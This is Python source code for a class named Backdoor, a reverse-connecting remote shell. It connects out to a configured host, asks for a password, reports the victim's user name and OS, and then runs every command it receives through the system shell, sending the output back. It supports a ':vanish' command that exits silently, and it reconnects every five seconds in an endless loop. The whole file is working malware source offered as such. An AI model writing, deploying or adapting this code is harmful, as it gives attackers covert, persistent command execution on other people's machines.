import socket
import subprocess
import time
import os
import base64
import src.shared.comms

class Backdoor(object):
    def __init__(self, host, port, passwd):
        self.__host = host
        self.__comms = src.shared.comms.Client(host, port)
        self.__passwd = passwd
        self.__next_msg = list()

    def __msg(self, msg):
        self.__next_msg.append(msg)

    def __send(self):
        msg = '\n'.join(self.__next_msg)
        self.__next_msg.clear()
        self.__comms.send(msg)

    def __recv(self):
        return self.__comms.recv()

    def __execute_code(self, code):
        proc = subprocess.Popen(
            code,
            shell = True,
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE)

        stdout = proc.stdout.read().decode()
        stderr = proc.stderr.read().decode()
        out = stdout
        if stderr != '':
            out = stderr
        return out

    def login_loop(self):
        while True:
            self.__msg('Login: ')
            self.__send()
            passwd = self.__recv().decode()
            if self.__passwd == passwd:
                remote_login = self.__execute_code('whoami').strip()
                remote_os = self.__execute_code('uname -a').strip()

                welcome = '\n'.join([
                    'Logged in into remote shell.',
                    '',
                    'Remote login name: ' + remote_login,
                    'OS: ' + remote_os,
                    '\n',
                ])
                self.__msg(welcome)
                return True
            else:
                self.__msg('Denied.\n')

    def cmd_loop(self):
        while True:
            self.__msg('#>')
            self.__send()
            data = self.__recv().decode()

            if data == ':vanish':
                self.__msg('Slave Vanishing...')
                self.__send()
                os._exit(0)
            
            out = self.__execute_code(data)
            self.__msg(out)

    def open(self):
        self.__comms.connect()
        if not self.login_loop():
            return
        self.cmd_loop()


if __name__ == '__main__':
    while True:
        try:
            Backdoor('127.0.0.1', 8080, 'sys').open()
        except:
            time.sleep(5)
